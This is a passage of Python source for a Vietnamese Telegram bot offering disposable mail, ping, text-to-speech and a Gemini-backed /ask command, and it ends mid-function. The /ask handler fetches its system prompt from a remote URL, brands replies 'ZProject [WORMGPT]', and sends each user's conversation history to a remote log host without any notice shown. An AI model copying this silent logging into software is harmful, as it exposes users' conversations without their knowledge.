@increment_interaction_count
# Lệnh /adminph không cần group_membership_required vì đây là lệnh dành riêng cho Admin
def admin_reply_to_feedback(message):
    logging.info(f"Received /adminph from user {message.from_user.id} in chat {message.chat.id}")
    if message.from_user.id != ADMIN_ID:
        return send_message_robustly(message.chat.id, text="🚫 Bạn không có quyền sử dụng lệnh này.", parse_mode="HTML", reply_to_message_id=message.message_id)

    if not message.reply_to_message:
        return send_message_robustly(message.chat.id, text="⚠️ Bạn cần reply vào tin nhắn phản hồi của người dùng để sử dụng lệnh này.", parse_mode="HTML", reply_to_message_id=message.message_id)

    original_feedback_message_id = message.reply_to_message.message_id
    with feedback_messages_lock:
        feedback_data = bot.feedback_messages.get(original_feedback_message_id)

    if not feedback_data:
        return send_message_robustly(message.chat.id, text="❌ Không tìm thấy thông tin chat của người dùng này. Có thể tin nhắn quá cũ hoặc bot đã khởi động lại.", parse_mode="HTML", reply_to_message_id=message.message_id)

    user_chat_id = feedback_data['chat_id']
    user_id_to_tag = feedback_data['user_id']
    user_name_to_tag = feedback_data['user_first_name']
    original_feedback_text = feedback_data['feedback_text']

    admin_response_text = message.text.replace("/adminph", "").strip()

    if not admin_response_text:
        return send_message_robustly(message.chat.id, text="⚠️ Vui lòng nhập nội dung phản hồi của admin. Ví dụ: <code>/adminph Cảm ơn bạn, chúng tôi đã khắc phục lỗi.</code>", parse_mode="HTML", reply_to_message_id=message.message_id)

    user_tag = f"<a href='tg://user?id={user_id_to_tag}'>{user_name_to_tag}</a>"

    admin_reply_to_user = (
        f"<b>👨‍💻 Admin đã phản hồi bạn {user_tag}!</b>\n\n"
        f"<b>Nội dung phản hồi của bạn:</b>\n"
        f"<blockquote>{html_escape(original_feedback_text)}</blockquote>\n\n"
        f"<b>Phản hồi từ Admin:</b>\n"
        f"<blockquote>{html_escape(admin_response_text)}</blockquote>\n\n"
        f"<i>Nếu bạn có thêm câu hỏi, vui lòng gửi phản hồi mới qua lệnh <code>/phanhoi</code>.</i>"
    )

    try:
        bot.send_message(
            chat_id=user_chat_id,
            text=admin_reply_to_user,
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        send_message_robustly(message.chat.id, text="✅ Đã gửi phản hồi của Admin đến người dùng thành công.", parse_mode="HTML", reply_to_message_id=message.message_id)
    except Exception as e:
        logging.error(f"Lỗi khi gửi phản hồi của admin đến người dùng {user_chat_id}: {e}")
        send_message_robustly(message.chat.id, text="❌ Đã xảy ra lỗi khi gửi phản hồi của Admin đến người dùng.", parse_mode="HTML", reply_to_message_id=message.message_id)

@bot.message_handler(commands=["sever"])
@increment_interaction_count
# Lệnh /sever không cần group_membership_required vì đây là lệnh dành riêng cho Admin
def show_groups(message):
    logging.info(f"Received /sever from user {message.from_user.id} in chat {message.chat.id}")
    if message.from_user.id != ADMIN_ID:
        return send_message_robustly(message.chat.id, text="🚫 Bạn không có quyền sử dụng lệnh này.", parse_mode="HTML", reply_to_message_id=message.message_id)
    
    with user_group_info_lock:
        if not GROUP_INFOS:
            return send_message_robustly(message.chat.id, text="📭 Hiện tại bot chưa có thông tin về nhóm nào.", parse_mode="HTML", reply_to_message_id=message.message_id)
        
        text = "<b>📦 Sever:</b>\n\n"
        for g in GROUP_INFOS:
            title = g.get("title", "Không rõ tên nhóm")
            link = f"https://t.me/{g.get('username')}" if g.get("username") else "⛔ Không có link mời"
            text += f"📌 <b>{title}</b>\n{link}\n\n"
    
    send_message_robustly(message.chat.id, text=text, parse_mode="HTML", disable_web_page_preview=True, reply_to_message_id=message.message_id)

@bot.message_handler(commands=['mail10p'])
@increment_interaction_count
@group_membership_required
def handle_mail10p(message):
    logging.info(f"Received /mail10p from user {message.from_user.id} in chat {message.chat.id}")
    sync_chat_to_server(message.chat)
    user_id = message.chat.id
    
    with user_data_lock:
        if user_id in user_data:
            elapsed_time = int(time.time() - user_data[user_id]["created_at"])
            remaining_time = 600 - elapsed_time
            if remaining_time > 0:
                minutes = remaining_time // 60
                seconds = remaining_time % 60
                
                mail_info_text = (
                    f"⚠️ Bạn đã có một mail 10 phút rồi:\n"
                    f"📧 `{user_data[user_id]['email']}`\n"
                    f"⏰ Mail này sẽ hết hạn sau {minutes} phút {seconds} giây."
                )
                markup = build_mail_buttons(user_id, 'mail_info')
                
                sent_msg = send_message_robustly(message.chat.id, 
                                                text=mail_info_text,
                                                parse_mode='Markdown',
                                                reply_markup=markup,
                                                reply_to_message_id=message.message_id)
                with mail_messages_state_lock:
                    if sent_msg:
                        bot.mail_messages_state[sent_msg.message_id] = {'chat_id': user_id, 'user_id': user_id, 'type': 'mail_info'}
                return
            else:
                del user_data[user_id]
                send_message_robustly(message.chat.id, "⏰ Mail 10 phút của bạn đã hết hạn, đang tạo mail mới...", parse_mode='Markdown', reply_to_message_id=message.message_id)

    email, pwd, token = create_temp_mail()

    if email:
        with user_data_lock:
            user_data[user_id] = {
                "email": email,
                "password": pwd,
                "token": token,
                "created_at": time.time()
            }
        
        mail_info_text = (
            f"✅ Mail 10 phút của bạn là:\n"
            f"📧 `{email}`\n"
            f"⏰ Hết hạn sau 10 phút."
        )
        markup = build_mail_buttons(user_id, 'mail_info')
        
        sent_msg = send_message_robustly(message.chat.id, 
                                       text=mail_info_text, 
                                       parse_mode='Markdown',
                                       reply_markup=markup,
                                       reply_to_message_id=message.message_id)
        with mail_messages_state_lock:
            if sent_msg:
                bot.mail_messages_state[sent_msg.message_id] = {'chat_id': user_id, 'user_id': user_id, 'type': 'mail_info'}
        
        threading.Thread(target=auto_delete_email, args=(user_id,)).start()
    else:
        send_message_robustly(message.chat.id, "❌ Không thể tạo email. Vui lòng thử lại sau!", parse_mode='Markdown', reply_to_message_id=message.message_id)

@bot.message_handler(commands=['ping'])
@group_membership_required
def ping_command(message):
    start_time = time.time()
    
    sent_message = bot.send_message(message.chat.id, "Đang Đo Ping Sever Bot...", parse_mode='HTML')
    
    end_time = time.time()
    
    ping_ms = round((end_time - start_time) * 1000)

    html_message = f"""
<blockquote>
    <b>⚡ Ping Sever Bot hiện tại:</b> <i>{ping_ms}ms</i>
</blockquote>
"""
    keyboard = types.InlineKeyboardMarkup()
    refresh_button = types.InlineKeyboardButton("♻️ Làm mới Ping", callback_data='refresh_ping')
    keyboard.add(refresh_button)

    bot.edit_message_text(chat_id=message.chat.id, 
                          message_id=sent_message.message_id,
                          text=html_message, 
                          reply_markup=keyboard, 
                          parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == 'refresh_ping')
def refresh_ping_callback(call):
    bot.answer_callback_query(call.id) 

    start_time = time.time()
    
    bot.edit_message_text(chat_id=call.message.chat.id, 
                          message_id=call.message.message_id,
                          text="Đang làm mới ping...", 
                          parse_mode='HTML')

    end_time = time.time()
    
    ping_ms = round((end_time - start_time) * 1000)

    html_message = f"""
<blockquote>
    <b>⚡ Ping Sever Bot Hiện Tại hiện tại:</b> <i>{ping_ms}ms</i>
</blockquote>
"""
    keyboard = types.InlineKeyboardMarkup()
    refresh_button = types.InlineKeyboardButton("♻️ Làm mới Ping", callback_data='refresh_ping')
    keyboard.add(refresh_button)

    bot.edit_message_text(chat_id=call.message.chat.id, 
                          message_id=call.message.message_id,
                          text=html_message, 
                          reply_markup=keyboard, 
                          parse_mode='HTML')

@bot.message_handler(commands=['xoamail10p'])
@increment_interaction_count
@group_membership_required
def handle_xoamail10p(message):
    logging.info(f"Received /xoamail10p from user {message.from_user.id} in chat {message.chat.id}")
    sync_chat_to_server(message.chat)
    user_id = message.chat.id

    with user_data_lock:
        if user_id in user_data:
            del user_data[user_id]
            send_message_robustly(message.chat.id, "<i>🗑️ Mail 10 phút của bạn đã được xóa thành công!</i>", parse_mode='HTML', reply_to_message_id=message.message_id)
        else:
            send_message_robustly(message.chat.id, "<i>⚠️ Bạn không có mail 10 phút nào đang hoạt động để xóa.<i>", parse_mode='HTML', reply_to_message_id=message.message_id)

def _get_inbox_content(user_id):
    with user_data_lock:
        info = user_data.get(user_id)

    if not info:
        return "<i>❌ Bạn chưa tạo email. Gõ /mail10p để tạo nhé!</i>", None, 'HTML'

    elapsed_time = int(time.time() - info["created_at"])
    if elapsed_time >= 600:
        expired_mail_address = info.get('email', 'không xác định')

        with user_data_lock:
            del user_data[user_id]
        
        reply_text = (
            f"⏰ <b>Mail <code>{expired_mail_address}</code> của bạn đã hết hạn!</b> "
            f"<blockquote>Tất cả thư của mail này sẽ bị xóa.</blockquote> "
            f"Vui lòng tạo mail mới bằng lệnh /mail10p."
        )
        return reply_text, None, 'HTML'

    headers = {
        "Authorization": f"Bearer {info['token']}"
    }

    try:
        r = session.get("https://api.mail.tm/messages", headers=headers)
        r.raise_for_status()
        messages = r.json().get("hydra:member", [])
        
        reply_text = ""
        if not messages:
            reply_text = "📭 Hộp thư của bạn hiện đang trống."
        else:
            reply_text = f"📥 Có {len(messages)} thư trong hộp thư:\n"
            for msg in messages:
                sender = msg['from']['address']
                subject = msg['subject']
                preview = msg['intro']
                
                sender_esc = html_escape(sender)
                subject_esc = html_escape(subject)
                preview_esc = html_escape(preview)

                reply_text += f"\n👤 <b>Từ:</b> <code>{sender_esc}</code>\n" \
                              f"✉️ <b>Chủ đề:</b> {subject_esc}\n" \
                              f"📝 <b>Nội dung:</b> {preview_esc}\n"
        
        markup = build_mail_buttons(user_id, 'inbox')
        return reply_text, markup, 'HTML'

    except Exception as e:
        logging.error(f"Lỗi khi kiểm tra hộp thư Mail.tm cho user {user_id}: {e}")
        return "❌ Lỗi khi kiểm tra hộp thư. Vui lòng thử lại sau.", None, 'Markdown'

@bot.message_handler(commands=['hopthu'])
@increment_interaction_count
@group_membership_required
def handle_hopthu(message):
    logging.info(f"Received /hopthu from user {message.from_user.id} in chat {message.chat.id}")
    sync_chat_to_server(message.chat)
    user_id = message.chat.id
    
    text, markup, parse_mode = _get_inbox_content(user_id)
    sent_msg = send_message_robustly(message.chat.id, 
                                   text=text, 
                                   parse_mode=parse_mode, 
                                   reply_markup=markup,
                                   reply_to_message_id=message.message_id)
    with mail_messages_state_lock:
        if sent_msg:
            bot.mail_messages_state[sent_msg.message_id] = {'chat_id': user_id, 'user_id': user_id, 'type': 'inbox'}

def format_ai_response_html(text):
    parts = []
    # Split by code blocks (```language\ncode\n``` or ```\ncode\n```)
    code_blocks = re.split(r"```(?:\w+)?\n(.*?)```", text, flags=re.DOTALL)

    for i, part in enumerate(code_blocks):
        if i % 2 == 0:  # This is a text part
            if part:
                parts.append({"type": "text", "content": html_escape(part.strip()), "raw_content": part.strip()})
        else:  # This is a code part
            if part:
                # Code blocks need special handling, but for HTML, <code> is fine.
                # MarkdownV2 would use backticks.
                formatted_code = f"<code>{html_escape(part.strip())}</code>"
                parts.append({"type": "code", "content": formatted_code, "raw_content": part.strip()})
    return parts

@bot.callback_query_handler(func=lambda call: call.data.startswith("copycode|"))
def copy_code_button(call):
    try:
        _, code_id = call.data.split("|", 1)
        with code_snippets_lock:
            code_content = bot.code_snippets.get(code_id)

        if code_content:
            bot.answer_callback_query(call.id, text="Đã sao chép nội dung code!", show_alert=True)
            try:
                # Sending as MarkdownV2 to ensure correct code block formatting
                # Note: MarkdownV2 requires escaping specific characters
                # Simple escape for common MarkdownV2 special chars not in code
                escaped_code = code_content.replace("\\", "\\\\").replace("`", "\`").replace("*", "\*").replace("_", "\_").replace("~", "\~").replace(">", "\>").replace("#", "\#").replace("+", "\+").replace("-", "\-").replace("=", "\=").replace("|", "\|").replace("{", "\{").replace("}", "\}").replace(".", "\.").replace("!", "\!")
                
                bot.send_message(
                    chat_id=call.message.chat.id,
                    text=f"```\n{code_content}\n```", # Using original code content, let Telegram handle markdown
                    parse_mode="MarkdownV2",
                    reply_to_message_id=call.message.message_id
                )
            except telebot.apihelper.ApiTelegramException as e:
                logging.warning(f"Failed to send code snippet for copy to chat {call.message.chat.id} with MarkdownV2: {e}. Sending plain text.")
                bot.send_message(
                    chat_id=call.message.chat.id,
                    text=f"Bạn có thể sao chép đoạn code này:\n\n{code_content}",
                    reply_to_message_id=call.message.message_id
                )
        else:
            bot.answer_callback_query(call.id, text="Lỗi: Không tìm thấy nội dung code này.", show_alert=True)
    except Exception as e:
        logging.error(f"Lỗi khi xử lý nút copy code: {e}")
        bot.answer_callback_query(call.id, text="Đã xảy ra lỗi khi sao chép code.", show_alert=True)

@bot.message_handler(commands=["ask"])
@increment_interaction_count
@group_membership_required
def ask_command(message):
    logging.info(f"Received /ask from user {message.from_user.id} in chat {message.chat.id}")
    sync_chat_to_server(message.chat)
    prompt = message.text.replace("/ask", "").strip()
    if not prompt:
        return send_message_robustly(message.chat.id, text="❓ Bạn chưa nhập câu hỏi rồi đó! Vui lòng gõ <code>/ask &lt;câu hỏi của bạn&gt;</code>.", parse_mode="HTML", reply_to_message_id=message.message_id)

    try:
        msg_status = bot.send_message(message.chat.id, "🤖", reply_to_message_id=message.message_id)
    except telebot.apihelper.ApiTelegramException as e:
        logging.warning(f"Failed to send initial 'thinking' message in chat {message.chat.id}: {e}. Proceeding without reply_to.")
        msg_status = bot.send_message(message.chat.id, "🤖")

    user_id = message.from_user.id
    user_name = message.from_user.first_name
    memory = load_user_memory(user_id)

    try:
        prompt_data = session.get(REMOTE_PROMPT_URL, timeout=DEFAULT_TIMEOUT_GLOBAL).json()
        system_prompt = prompt_data.get("prompt", "Bạn là AI thông minh và hữu ích.")
    except Exception as e:
        logging.error(f"Lỗi tải prompt từ xa: {e}")
        system_prompt = "Bạn là AI thông minh và hữu ích."

    history_block = ""
    if memory:
        for item in memory[-5:]:
            history_block += f"Người dùng hỏi: {item['question']}\nAI: {item['answer']}\n"

    full_prompt = f"{system_prompt}\n\n[Ngữ cảnh trước đó với {user_name}]\n{history_block}\nNgười dùng hiện tại hỏi: {prompt}"

    headers = {"Content-Type": "application/json"}
    parts = [{"text": full_prompt}]
    image_attached = False

    if message.reply_to_message and message.reply_to_message.photo:
        try:
            photo = message.reply_to_message.photo[-1]
            file_info = bot.get_file(photo.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            image = Image.open(BytesIO(downloaded_file))
            buffer = BytesIO()
            if image.mode in ("RGBA", "P"):
                image = image.convert("RGB")
            image.save(buffer, format="JPEG")
            base64_img = base64.b64encode(buffer.getvalue()).decode()
            parts.insert(0, {
                "inline_data": {
                    "mime_type": "image/jpeg",
                    "data": base64_img
                }
            })
            image_attached = True
        except Exception as e:
            logging.error(f"Lỗi xử lý ảnh đính kèm: {e}")

    data = {"contents": [{"parts": parts}]}
    try:
        res = session.post(GEMINI_URL, headers=headers, json=data, timeout=DEFAULT_TIMEOUT_GLOBAL)
        res.raise_for_status()
        result = res.json()["candidates"][0]["content"]["parts"][0]["text"]
    except Exception as e:
        try:
            bot.edit_message_text(
                f"❌ Đã xảy ra lỗi khi gọi API Gemini:\n<pre>{html_escape(str(e))}</pre>",
                msg_status.chat.id,
                msg_status.message_id,
                parse_mode="HTML"
            )
        except telebot.apihelper.ApiTelegramException as edit_e:
            logging.warning(f"Failed to edit message {msg_status.message_id}: {edit_e}. Sending new error message.")
            send_message_robustly(message.chat.id, text=f"❌ Đã xảy ra lỗi khi gọi API Gemini:\n<pre>{html_escape(str(e))}</pre>", parse_mode="HTML")
        return

    entry = {
        "question": prompt,
        "answer": result,
        "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "with_image": image_attached,
        "name": message.from_user.first_name
    }
    memory.append(entry)
    save_user_memory(user_id, memory)

    try:
        session.post(
            f"{REMOTE_LOG_HOST}?uid={user_id}",
            data=json.dumps(memory, ensure_ascii=False),
            headers={"Content-Type": "application/json"},
            timeout=DEFAULT_TIMEOUT_GLOBAL
        )
    except Exception as e:
        logging.error(f"Lỗi gửi log từ xa: {e}")

    response_parts_structured = format_ai_response_html(result)
    reply_id = uuid.uuid4().hex[:6]
    
    with voice_map_lock:
        bot.voice_map[reply_id] = result

    total_raw_length = 0
    full_content_for_file = []
    for part in response_parts_structured:
        total_raw_length += len(part["raw_content"])
        if part["type"] == "text":
            full_content_for_file.append(part["raw_content"])
        elif part["type"] == "code":
            full_content_for_file.append(f"\n```\n{part['raw_content']}\n```\n")

    if total_raw_length > 1500 or any(p["type"] == "code" for p in response_parts_structured):
        filename = f"zproject_{reply_id}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write("".join(full_content_for_file))

        with open(filename, "rb") as f:
            try:
                bot.send_document(
                    message.chat.id,
                    f,
                    caption=f"📄 Trả lời quá dài hoặc có code block! Mình đã đóng gói vào file <code>{filename}</code> nha {html_escape(message.from_user.first_name)}!\n\n"
                            f"<i>Vui lòng tải xuống để xem toàn bộ nội dung.</i>",
                    parse_mode="HTML",
                    reply_to_message_id=message.message_id
                )
            except telebot.apihelper.ApiTelegramException as e:
                logging.warning(f"Failed to send document replying to message {message.message_id}: {e}. Sending without reply_to.")
                f.seek(0)
                bot.send_document(
                    message.chat.id,
                    f,
                    caption=f"📄 Trả lời quá dài hoặc có code block! Mình đã đóng gói vào file <code>{filename}</code> nha {html_escape(message.from_user.first_name)}!\n\n"
                            f"<i>Vui lòng tải xuống để xem toàn bộ nội dung.</i>",
                    parse_mode="HTML"
                )
        os.remove(filename)
        try:
            bot.delete_message(msg_status.chat.id, msg_status.message_id)
        except telebot.apihelper.ApiTelegramException as e:
            logging.warning(f"Failed to delete status message {msg_status.message_id}: {e}")

    else:
        main_markup = build_reply_button(user_id, prompt, reply_id)
        current_message_text = f"<blockquote expandable>🤖 <i>ZProject [WORMGPT] trả lời:</i></blockquote>\n\n"
        
        combined_text_for_telegram = ""
        for part in response_parts_structured:
            if part["type"] == "text":
                combined_text_for_telegram += part["content"] + "\n\n"
            elif part["type"] == "code":
                copy_id = uuid.uuid4().hex[:8]
                with code_snippets_lock:
                    bot.code_snippets[copy_id] = part["raw_content"]
                
                code_markup = InlineKeyboardMarkup()
                code_markup.add(InlineKeyboardButton("📄 Sao chép Code", callback_data=f"copycode|{copy_id}"))

                try:
                    if combined_text_for_telegram.strip():
                        bot.edit_message_text(
                            current_message_text + combined_text_for_telegram.strip(),
                            msg_status.chat.id,
                            msg_status.message_id,
                            parse_mode="HTML"
                        )
                        msg_status = None # Reset msg_status so we send a new message for code
                    
                    bot.send_message(
                        message.chat.id,
                        text=f"<b>Code:</b>\n{part['content']}",
                        parse_mode="HTML",
                        reply_markup=code_markup,
                        reply_to_message_id=message.message_id
                    )
                except telebot.apihelper.ApiTelegramException as e:
                    logging.warning(f"Failed to send code part in chat {message.chat.id}: {e}. Sending without reply_to.")
                    bot.send_message(
                        message.chat.id,
                        text=f"<b>Code:</b>\n{part['content']}",
                        parse_mode="HTML",
                        reply_markup=code_markup
                    )
                combined_text_for_telegram = "" # Clear buffer after sending code
        
        final_response_text = current_message_text + combined_text_for_telegram.strip()
        
        try:
            if msg_status: # If msg_status is still valid (meaning no code block was sent as a new message)
                bot.edit_message_text(
                    final_response_text,
                    msg_status.chat.id,
                    msg_status.message_id,
                    parse_mode="HTML",
                    reply_markup=main_markup
                )
            else: # If msg_status was consumed by a code block, send as a new message
                bot.send_message(
                    message.chat.id,
                    text=final_response_text,
                    parse_mode="HTML",
                    reply_markup=main_markup,
                    reply_to_message_id=message.message_id
                )
        except telebot.apihelper.ApiTelegramException as e:
            logging.warning(f"Failed to send/edit final message in chat {message.chat.id}: {e}. Sending as new message.")
            send_message_robustly(
                message.chat.id,
                text=final_response_text,
                parse_mode="HTML",
                reply_markup=main_markup,
                reply_to_message_id=message.message_id
            )
        except Exception as e:
            logging.error(f"Error in final message sending for /ask: {e}")
            send_message_robustly(message.chat.id, text=f"❌ Đã xảy ra lỗi khi gửi kết quả: {e}", parse_mode="HTML", reply_to_message_id=message.message_id)

# --- NÚT CALLBACK CỦA BOT ZPROJECT ---

@bot.callback_query_handler(func=lambda call: call.data.startswith("retry|"))
def retry_button(call):
    try:
        _, uid, question = call.data.split("|", 2)
        if str(call.from_user.id) != uid:
            return bot.answer_callback_query(call.id, "🚫 Bạn không phải người yêu cầu câu hỏi này.", show_alert=True)

        # Kiểm tra tư cách thành viên trước khi thực hiện retry
        if not check_group_membership(REQUIRED_GROUP_ID, call.from_user.id):
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("Tham gia nhóm ngay", url=REQUIRED_GROUP_LINK))
            bot.answer_callback_query(call.id, "⚠️ Vui lòng tham gia nhóm để sử dụng bot này.", show_alert=True)
            bot.send_message(
                call.message.chat.id,
                text=f"⚠️ Vui lòng tham gia nhóm <a href='{REQUIRED_GROUP_LINK}'>ZProject Thông Báo</a> để sử dụng bot này.",
                parse_mode="HTML",
                reply_markup=markup
            )
            return

        msg = SimpleNamespace(
            chat=call.message.chat,
            message_id=call.message.message_id,
            text="/ask " + question,
            from_user=call.from_user,
            reply_to_message=None # Ensure this is None for retries
        )

        bot.answer_callback_query(call.id, "🔁 Đang thử lại câu hỏi...")
        try:
            bot.edit_message_text("🤖 Đang xử lý lại...", call.message.chat.id, call.message.message_id)
        except telebot.apihelper.ApiTelegramException as e:
            logging.warning(f"Failed to edit message {call.message.message_id} on retry: {e}. Sending new 'thinking' message.")
            bot.send_message(call.message.chat.id, "🤖 Đang xử lý lại...", reply_to_message_id=call.message.message_id)

        Thread(target=ask_command, args=(msg,)).start()

    except Exception as e:
        bot.answer_callback_query(call.id, "⚠️ Lỗi khi thử lại!", show_alert=True)
        logging.error(f"[RETRY] Lỗi: {e}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("tts|"))
def tts_button(call):
    try:
        parts = call.data.split("|")
        uid = parts[1]
        reply_id = parts[2]

        if str(call.from_user.id) != uid:
            return bot.answer_callback_query(call.id, "🚫 Bạn không phải người yêu cầu voice này.", show_alert=True)

        # Kiểm tra tư cách thành viên trước khi tạo TTS
        if not check_group_membership(REQUIRED_GROUP_ID, call.from_user.id):
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("Tham gia nhóm ngay", url=REQUIRED_GROUP_LINK))
            bot.answer_callback_query(call.id, "⚠️ Vui lòng tham gia nhóm để sử dụng chức năng này.", show_alert=True)
            bot.send_message(
                call.message.chat.id,
                text=f"⚠️ Vui lòng tham gia nhóm <a href='{REQUIRED_GROUP_LINK}'>ZProject Thông Báo</a> để sử dụng chức năng này.",
                parse_mode="HTML",
                reply_markup=markup
            )
            return

        with voice_map_lock:
            answer = bot.voice_map.get(reply_id)
        if not answer:
            return bot.answer_callback_query(call.id, "❌ Không tìm thấy dữ liệu giọng nói.", show_alert=True)

        clean_text = re.sub(r"<code>.*?</code>", "", answer, flags=re.DOTALL)
        clean_text = re.sub(r"<[^>]+>", "", clean_text)
        clean_text = re.sub(r"```.*?```", "", clean_text, flags=re.DOTALL)
        clean_text = clean_text.replace('"', '').replace("'", '')

        text_to_speak = clean_text.strip()

        if not text_to_speak or len(text_to_speak) < 5:
            return bot.answer_callback_query(call.id, "❗ Nội dung quá ngắn hoặc rỗng để chuyển voice.", show_alert=True)

        filename = f"zproject_tts_{reply_id}.mp3"
        tts = gTTS(text=text_to_speak, lang="vi", slow=False)
        tts.save(filename)

        with open(filename, "rb") as f:
            try:
                bot.send_voice(call.message.chat.id, f, caption="🗣️ Đây là Voice ZProject:v", reply_to_message_id=call.message.message_id)
            except telebot.apihelper.ApiTelegramException as e:
                logging.warning(f"Failed to send voice replying to message {call.message.message_id}: {e}. Sending without reply_to.")
                f.seek(0)
                bot.send_voice(call.message.chat.id, f, caption="🗣️ Đây là Voice ZProject:v")
        os.remove(filename)
        bot.answer_callback_query(call.id, "🎧 Voice đã được gửi!")
    except Exception as e:
        bot.answer_callback_query(call.id, "⚠️ Lỗi khi tạo voice.", show_alert=True)
        logging.error(f"[TTS] Lỗi: {e}")

# --- NÚT CALLBACK CỦA MAIL.TM ---

def check_mail_owner(call, expected_user_id):
    if call.from_user.id != int(expected_user_id):
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("Tham gia nhóm ngay", url=REQUIRED_GROUP_LINK))
        bot.answer_callback_query(call.id, "🚫 Bạn không có quyền sử dụng chức năng này. Vui lòng tham gia nhóm.", show_alert=True)
        bot.send_message(
            call.message.chat.id,
            text=f"⚠️ Vui lòng tham gia nhóm <a href='{REQUIRED_GROUP_LINK}'>ZProject Thông Báo</a> để sử dụng bot này.",
            parse_mode="HTML",
            reply_markup=markup
        )
        return False
    return True

@bot.callback_query_handler(func=lambda call: call.data.startswith("mailtm_inbox|"))
def show_inbox_button(call):
    user_id = call.message.chat.id
    expected_user_id = call.data.split("|")[1]

    if not check_mail_owner(call, expected_user_id):
        return

    bot.answer_callback_query(call.id, "Đang tải hộp thư...", show_alert=False)

    text, markup, parse_mode = _get_inbox_content(user_id)

    try:
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=text,
            parse_mode=parse_mode,
            reply_markup=markup
        )
        with mail_messages_state_lock:
            if call.message.message_id in bot.mail_messages_state:
                bot.mail_messages_state[call.message.message_id]['type'] = 'inbox'
    except telebot.apihelper.ApiTelegramException as e:
        if "message is not modified" in str(e):
            logging.info(f"Message {call.message.message_id} in chat {call.message.chat.id} was not modified (inbox).")
        else:
            logging.error(f"Lỗi khi chỉnh sửa tin nhắn thành hộp thư cho user {user_id}: {e}")
            # Fallback to sending a new message if edit fails
            send_message_robustly(call.message.chat.id, text=text, parse_mode=parse_mode, reply_markup=markup)
            with mail_messages_state_lock:
                if call.message.message_id in bot.mail_messages_state:
                    del bot.mail_messages_state[call.message.message_id] # Clean up old state
                sent_msg = send_message_robustly(call.message.chat.id, "❌ Đã có lỗi khi cập nhật hộp thư. Đây là tin nhắn mới.", parse_mode="HTML")
                if sent_msg:
                    bot.mail_messages_state[sent_msg.message_id] = {'chat_id': user_id, 'user_id': user_id, 'type': 'inbox'}
            
    except Exception as e:
        logging.error(f"Lỗi không xác định khi xem hộp thư: {e}")
        bot.answer_callback_query(call.id, "⚠️ Lỗi khi xem hộp thư!", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data.startswith("mailtm_refresh|"))
def refresh_inbox_button(call):
    user_id = call.message.chat.id
    expected_user_id = call.data.split("|")[1]

    if not check_mail_owner(call, expected_user_id):
        return

    bot.answer_callback_query(call.id, "Đang làm mới hộp thư...", show_alert=False)

    text, markup, parse_mode = _get_inbox_content(user_id)

    try:
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=text,
            parse_mode=parse_mode,
            reply_markup=markup
        )
        with mail_messages_state_lock:
            if call.message.message_id in bot.mail_messages_state:
                bot.mail_messages_state[call.message.message_id]['type'] = 'inbox'
    except telebot.apihelper.ApiTelegramException as e:
        if "message is not modified" in str(e):
            logging.info(f"Message {call.message.message_id} in chat {call.message.chat.id} was not modified (refresh inbox).")
        else:
            logging.error(f"Lỗi khi làm mới hộp thư cho user {user_id}: {e}")
            # Fallback to sending a new message if edit fails
            send_message_robustly(call.message.chat.id, text=text, parse_mode=parse_mode, reply_markup=markup)
            with mail_messages_state_lock:
                if call.message.message_id in bot.mail_messages_state:
                    del bot.mail_messages_state[call.message.message_id]
                sent_msg = send_message_robustly(call.message.chat.id, "❌ Đã có lỗi khi làm mới hộp thư. Đây là tin nhắn mới.", parse_mode="HTML")
                if sent_msg:
                    bot.mail_messages_state[sent_msg.message_id] = {'chat_id': user_id, 'user_id': user_id, 'type': 'inbox'}
    except Exception as e:
        logging.error(f"Lỗi không xác định khi làm mới hộp thư: {e}")
        bot.answer_callback_query(call.id, "⚠️ Lỗi khi làm mới hộp thư!", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data.startswith("mailtm_back|"))
def back_to_mail_info_button(call):
    user_id = call.message.chat.id
    expected_user_id = call.data.split("|")[1]

    if not check_mail_owner(call, expected_user_id):
        return
    
    bot.answer_callback_query(call.id, "Quay lại thông tin mail...", show_alert=False)

    with user_data_lock:
        info = user_data.get(user_id)

    if not info:
        text = "<i>❌ Bạn chưa tạo email. Gõ /mail10p để tạo nhé!</i>"
        markup = None
        parse_mode = 'HTML'
    else:
        elapsed_time = int(time.time() - info["created_at"])
        remaining_time = 600 - elapsed_time
        if remaining_time > 0:
            minutes = remaining_time // 60
            seconds = remaining_time % 60
            text = (
                f"<blockquote>✅ Mail 10 phút của bạn là:\n"
                f"<code>📧 {info['email']}</code>\n"
                f"⏰ Hết hạn sau {minutes} phút {seconds} giây.</blockquote>"
            )
            markup = build_mail_buttons(user_id, 'mail_info')
            parse_mode = 'HTML'
        else:
            with user_data_lock:
                del user_data[user_id]
            text = "⏰ Mail 10 phút của bạn đã hết hạn! Vui lòng tạo mail mới bằng lệnh /mail10p."
            markup = None
            parse_mode = 'HTML'
    
    try:
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=text,
            parse_mode=parse_mode,
            reply_markup=markup
        )
        with mail_messages_state_lock:
            if call.message.message_id in bot.mail_messages_state:
                bot.mail_messages_state[call.message.message_id]['type'] = 'mail_info'
    except telebot.apihelper.ApiTelegramException as e:
        if "message is not modified" in str(e):
            logging.info(f"Message {call.message.message_id} in chat {call.message.chat.id} was not modified (back to mail info).")
        else:
            logging.error(f"Lỗi khi chỉnh sửa tin nhắn về thông tin mail cho user {user_id}: {e}")
            # Fallback to sending a new message if edit fails
            send_message_robustly(call.message.chat.id, text=text, parse_mode=parse_mode, reply_markup=markup)
            with mail_messages_state_lock:
                if call.message.message_id in bot.mail_messages_state:
                    del bot.mail_messages_state[call.message.message_id]
                sent_msg = send_message_robustly(call.message.chat.id, "❌ Đã có lỗi khi quay lại thông tin mail. Đây là tin nhắn mới.", parse_mode="HTML")
                if sent_msg:
                    bot.mail_messages_state[sent_msg.message_id] = {'chat_id': user_id, 'user_id': user_id, 'type': 'mail_info'}
    except Exception as e:
